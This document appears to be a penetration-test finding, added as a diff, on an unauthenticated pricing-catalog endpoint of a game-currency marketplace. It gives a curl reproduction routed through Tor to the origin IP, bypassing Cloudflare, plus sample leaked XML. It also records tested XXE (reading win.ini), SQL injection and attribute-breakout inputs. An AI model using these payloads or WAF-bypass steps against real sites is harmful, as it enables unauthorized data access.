@@ -1,0 +1,93 @@
+# F-W1 — Unauthenticated Pricing Catalog Disclosure (requests-xml.aspx)
+# webapp finding | suppliers.dfg.com.br (161.97.106.115) + antigo.dfg.com.br (161.97.106.115)
+
+## Severity: MEDIUM
+## CVSS: 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) — confidentiality of business pricing data
+## OWASP: A01:2021 Broken Access Control / A05 Security Misconfig (sensitive data exposure)
+
+## Target
+- URL: https://161.97.106.115/requests-xml.aspx?CurrencyCode=BRL (Host: suppliers.dfg.com.br)
+- Also: https://161.97.106.115/requests-xml.aspx?CurrencyCode=BRL (Host: antigo.dfg.com.br)
+- Stack: ASP.NET WebForms, IIS/10.0, ASP.NET 4.0.30319
+- Bypass Cloudflare: direct origin IP (no WAF)
+
+## Description
+The endpoint `requests-xml.aspx` returns an XML document containing the COMPLETE pricing
+catalog of the DFGames suppliers marketplace WITHOUT authentication. It leaks:
+- All games (Tibia Coins, DOFUS Brial/Dakal/Kourial/Mikhal/Jahash/Dragonios/Talkasha/Mikhahn,
+  Albion, Perfect World, Grand Fantasia, Free Fire, GTA/MTA, MU Online, etc.)
+- All server names per game
+- Exchange rates for every supported currency (BRL, USD, EUR, GBP, ...)
+- Per-game/server prices in every currency
+
+This is business-sensitive competitive intelligence (a competitor/attacker obtains the entire
+price list and FX rates the suppliers charge). The endpoint is reachable unauthenticated from
+the origin IP without passing through Cloudflare's WAF.
+
+## Reproduction (read-only, non-destructive)
+
+### Request (via Tor socks5h)
+```
+GET /requests-xml.aspx?CurrencyCode=BRL HTTP/2
+Host: suppliers.dfg.com.br
+User-Agent: Mozilla/5.0
+```
+Command (Tor exit 104.244.72.115):
+`curl -sS -x socks5h://127.0.0.1:9050 -k --max-time 30 "https://161.97.106.115/requests-xml.aspx?CurrencyCode=BRL" -H "Host: suppliers.dfg.com.br"`
+
+### Response (HTTP/2 200, Content-Type: text/xml; charset=utf-8, 1202 bytes)
+```
+<?xml version="1.0" encoding="utf-8" ?>
+<root>
+<game name="TibiaCoins">
+<server>Tibia Coins</server>
+<price code="BRL">54,000000</price>
+<minimum>0,00</minimum>
+<maximum>0,00</maximum>
+</game>
+<game name="DOFUS">
+<server>Brial</server>
+<price code="BRL">5,300000</price>
+<minimum>0,00</minimum>
+<maximum>0,00</maximum>
+</game>
+<game name="DOFUS">
+<server>Dakal</server>
+<price code="BRL">8,600000</price>
+...
+```
+Other currency rates confirmed:
+- ?CurrencyCode=USD → TibiaCoins 10,610914 / DOFUS Brial 1,041442 (USD/BRL rate ~5.1)
+- ?CurrencyCode=EUR → 9,141430 (EUR rate)
+- ?CurrencyCode=GBP → empty (no rate configured)
+
+## Timestamp (via Tor)
+- 2026-09-05T00:30:36Z (server date header) / captured 2026-09-05T00:32Z UTC (Tor exit 104.244.72.115)
+
+## Also tested & RULED OUT (negative results, documented for completeness)
+- **XXE**: NOT applicable. The endpoint GENERATES XML from a DB lookup; it does NOT parse any
+  XML input. POST with `Content-Type: text/xml` body (incl. malformed XML and XXE entities
+  `<!ENTITY x SYSTEM "file:///c:/windows/win.ini">`) is IGNORED — server returns default output
+  (USD). No XML parser exception observable → no server-side XML parsing → XXE not possible here.
+- **SQL injection** in CurrencyCode: NOT vulnerable. The lookup uses a 3-character prefix match
+  (LEFT/substring/switch on first 3 chars): `BRLXYZ`, `BRL ABC`, `BRL' AND '1'='2` all return the
+  BRL rate (54,000000), while `XBRL`, `BR`, `ZZZ` return empty. Boolean (`AND '1'='2`) does NOT
+  alter results and time-based `WAITFOR DELAY '0:0:5'` produced no delay (1.9s) → parameterized or
+  non-SQL lookup. The reflection is into the output XML only, not a SQL query string.
+- **XML attribute injection** (see F-W2): a lone double-quote `"` passes ASP.NET request
+  validation and is reflected unencoded, enabling attribute breakout (separate finding, Low).
+
+## Impact
+- Confidentiality: competitor/attacker obtains the full price list + FX rates of the marketplace
+  (business intelligence leak). No integrity/availability impact (read-only).
+- Enables price-undercutting intelligence, competitive analysis, and confirms the existence of a
+  legacy unauthenticated XML API exposed to the internet without WAF.
+
+## Recommendation
+- Require authentication (or a shared API key/HMAC) on `requests-xml.aspx`.
+- Restrict the endpoint to internal/trusted callers (IP allowlist) or move behind Cloudflare.
+- Do not expose FX rates / full catalog publicly; expose only the currencies a caller is entitled to.
+- Set `customErrors="On"` and disable detailed errors (already on for this endpoint).
+
+## Evidence artifacts
+- Raw responses: webapp/body_brl.xml, webapp/body_inj.xml, webapp/hdr_brl.txt
